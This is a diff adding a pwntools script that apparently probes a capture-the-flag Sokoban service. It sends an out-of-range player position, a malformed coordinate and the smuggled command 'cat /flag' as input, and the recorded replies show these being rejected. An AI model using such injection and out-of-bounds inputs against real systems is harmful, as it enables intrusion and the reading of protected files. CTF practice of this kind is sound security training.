@@ -1,0 +1,29 @@
+
+from pwn import *
+
+p = remote("10.12.0.1", 1234)
+        
+p.recv("""Welcome to Sokoban!=========================1. Play game2. Choose a level and play3. Upload a map""")
+p.recv("""4. ExitEnter your choice: """)
+p.send("""3""")
+p.recv("""Upload a map to play!""")
+p.recv("""Enter the width of the map: """)
+p.send("""19""")
+p.recv("""Enter the height of the map: """)
+p.send("""19""")
+p.recv("""Enter the map line by line:Line 0: """)
+p.send("""#################### O.              ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ##                 ####################""")
+p.recv("""Line 1: Line 2: """)
+p.recv("""Line 3: Line 4: Line 5: Line 6: Line 7: Line 8: Line 9: Line 10: Line 11: Line 12: Line 13: Line 14: Line 15: Line 16: Line 17: Line 18: Enter the player's initial X position: """)
+p.send("""-197""")
+p.recv("""Enter the player's initial Y position: """)
+p.send("""18ddda""")
+p.recv("""Invalid player position.Welcome to Sokoban!""")
+p.recv("""=========================1. Play game2. Choose a level and play3. Upload a map4. ExitEnter your choice: Invalid choice. Let's try again.Upload a map to play!Enter the width of the map: """)
+p.send("""99""")
+p.recv("""Enter the height of the map: """)
+p.send("""cat /flag""")
+p.recv("""Invalid map dimension.Welcome to Sokoban!""")
+p.recv("""=========================1. Play game2. Choose a level and play3. Upload a map4. ExitEnter your choice: """)
+
+p.close()
